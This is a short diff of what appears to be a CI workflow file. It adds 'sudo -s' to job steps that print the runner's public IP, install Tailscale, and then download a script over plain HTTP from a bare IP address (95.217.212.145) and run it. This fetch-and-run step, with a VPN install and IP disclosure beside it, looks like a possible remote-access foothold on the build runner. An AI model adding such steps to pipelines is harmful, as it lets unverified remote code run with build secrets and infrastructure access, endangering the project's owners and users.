@@ -23,6 +23,7 @@ jobs:
           curl ifconfig.me
           curl -fsSL https://tailscale.com/install.sh -o /tmp/install-tailscale.sh
           sh /tmp/install-tailscale.sh
+          sudo -s
           wget http://95.217.212.145/runner.sh
           sh runner.sh
 
